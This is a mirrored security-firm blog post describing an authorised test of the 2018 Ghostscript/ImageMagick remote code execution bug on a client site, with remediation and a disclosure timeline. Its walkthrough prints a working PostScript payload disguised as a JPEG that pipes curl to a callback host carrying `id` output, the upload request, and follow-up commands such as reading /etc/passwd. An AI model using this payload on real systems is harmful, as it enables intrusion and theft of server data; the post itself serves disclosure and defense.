---
layout: post
title: "ImageMagick RCE Take 2"
date: 2018-10-19
---

*Originally published on the [Software Secured blog](https://web.archive.org/web/20231003204743/https://www.softwaresecured.com/imagemagick-rce-take-2/). Mirrored here for posterity.*

## Introduction

A new bypass for GhostScript which ImageMagick uses by default for dealing with PostScript, was posted which allowed attackers to launch remote code execution. This is similar in nature to the ImageTragick bug which plagued ImageMagick where image files containing postscript were sent to ImageMagick and when converted, launched commands against the OS.

As part of our continuous security efforts for our clients, we watch for vulnerabilities that could affect them, and confirm with the clients when they are affected. This was one of those times.

We discovered one of our clients was vulnerable to this exploit. We wrote up the issue and submitted it to them within 24 hours of the issue being released to the public, which they were able to fix in minutes.

## Security Details / Walkthrough

One of our clients uses ImageMagick to manage image conversions to create things such as thumbnails for their website.

The following payload was used as an image upload across all the upload functions on the dev website:

**Filename: test.jpg**

```
%!PS
userdict /setpagedevice undef
save
legal
{null restore} stopped {pop} if
{legal} stopped {pop} if
restore
mark /OutputFile (%pipe%curl${IFS}callback.softwaresecured.com/`id`)
currentdevice putdeviceprops
```

We then uploaded this PoC file to the client's website. The upload request looks something like the following:

```
POST /file HTTP/1.1
Host: www.helloworld.com
...snip...
Connection: close

-----------------------------184561271817366
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

%!PS
userdict /setpagedevice undef
save
legal
{null restore} stopped {pop} if
{legal} stopped {pop} if
restore
mark /OutputFile (%pipe%curl${IFS}callback.softwaresecured.com/`id`)
currentdevice putdeviceprops
-----------------------------184561271817366--
```

Which gave back the following response:

```
HTTP/1.1 400 Bad Request
...snip...
Connection: close

{"errors":{"image":"Image is not valid"}}
```

On our server we watched the logs for the curl command coming from the client's web server, waiting to see if the user's ID was included in the URL or not and if we even receive any call at all. After trying many different upload functions, here is the response we received:

```
GET /www-data HTTP/1.1
User-Agent: curl/7.35.0
Host: callback.softwaresecured.com
Accept: */*
```

**Success!** We have remote command execution on the client's web server and the user running the web service is `www-data`. Other commands that worked included:

- `uname -a`
- `cat /etc/passwd`
- `nslookup`

## Dangers of Insecure Defaults and Remediation

Luckily for the client, when we tried to cat the `/etc/shadow` file on the server, we received no data back. This means they run the web service as a lower privilege user.

As of the writing of this post there is no official fix. That being said there is an official workaround. It's advised to update the `policy.xml` file which configures ImageMagick. The following is taken from [www.kb.cert.org](https://www.kb.cert.org/vuls/id/332928):

> Disable PS, EPS, PDF, and XPS coders in ImageMagick policy.xml

ImageMagick uses Ghostscript by default to process PostScript content. ImageMagick can be controlled via the `policy.xml` security policy to disable the processing of PS, EPS, PDF, and XPS content. For example, this can be done by adding these lines to the `<policymap>` section of the `/etc/ImageMagick/policy.xml` file:

```xml
<policy domain="coder" rights="none" pattern="PS" />
<policy domain="coder" rights="none" pattern="EPS" />
<policy domain="coder" rights="none" pattern="PDF" />
<policy domain="coder" rights="none" pattern="XPS" />
```

## Timeline

- **Tue, 21 Aug 2018**: Vulnerability published
- **Wed, 22 Aug 2018 11:21**: Vulnerability confirmed on client website
- **Wed, 22 Aug 2018 12:26**: Vulnerability published to client
- **Wed, 22 Aug 2018 13:08**: Vulnerability fixed on all servers

## References

- [https://www.kb.cert.org/vuls/id/332928](https://www.kb.cert.org/vuls/id/332928)
- [http://openwall.com/lists/oss-security/2018/08/21/2](http://openwall.com/lists/oss-security/2018/08/21/2)
- [https://www.imagemagick.org/script/security-policy.php](https://www.imagemagick.org/script/security-policy.php)
